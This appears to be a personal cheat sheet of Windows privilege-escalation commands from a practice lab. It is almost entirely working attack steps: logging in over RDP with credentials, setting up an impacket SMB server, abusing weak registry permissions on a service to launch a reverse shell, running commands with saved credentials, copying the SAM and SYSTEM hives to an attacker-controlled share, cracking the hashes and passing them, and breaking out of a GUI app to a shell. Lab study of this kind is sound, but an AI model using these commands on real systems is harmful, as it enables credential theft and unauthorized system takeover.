Use below command for rdp:

	"xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.110.135"

SmbServer:
	For setting a smbserver for file transfer use:
		"python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali ."

		"copy \\<Machine IP>\kali\file_to_send 			File_location_on_victim"

Weak Registry Permission:
	sc qc regsvc
	reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f

Saved Creds:
	"cmdkey /list"
	"runas /savecred /user:admin C:\PrivEsc\reverse.exe"

SAM password:
	"copy C:\Windows\Repair\SAM \\10.10.10.10\kali\"
	"copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\"
	"python3 creddump7/pwdump.py SYSTEM SAM"
	"hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt"
		or simply login with the hash "pth-winexe -U 'admin%hash(both hashes separated by a colon' //10.10.110.135 cmd.exe"

InSecure Gui Apps:
	"tasklist /V | findstr mspaint.exe"
	Open "file://c:/windows/system32/cmd.exe" in notepad or paint to get a system32 shell.